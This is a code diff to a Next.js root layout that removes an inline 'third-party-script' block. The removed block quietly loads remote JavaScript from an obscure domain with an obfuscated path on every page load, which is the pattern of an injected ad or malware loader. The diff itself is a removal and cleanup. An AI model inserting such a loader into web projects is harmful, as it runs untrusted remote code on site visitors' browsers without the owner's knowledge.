@@ -38,20 +38,7 @@ export default function RootLayout({ children }: RootLayoutProps) {
         {children}
         <Footer />
         <Analytics />
-        <Script id="third-party-script" strategy="afterInteractive">
-          {`
-(function(dchs){
-var d = document,
-    s = d.createElement('script'),
-    l = d.scripts[d.scripts.length - 1];
-s.settings = dchs || {};
-s.src = "//thatywexy.com/bMX.VPscd_GklP0AYhWJct/YeKml9/u-ZOUNlQkhPBT_Y/ygOyD/I/yDOQTWUwt/NVjCIX4rMmjgIL5/NKgW";
-s.async = true;
-s.referrerPolicy = 'no-referrer-when-downgrade';
-l.parentNode.insertBefore(s, l);
-})({})
-          `}
-        </Script>
+     
       </body>
     </html>
   );
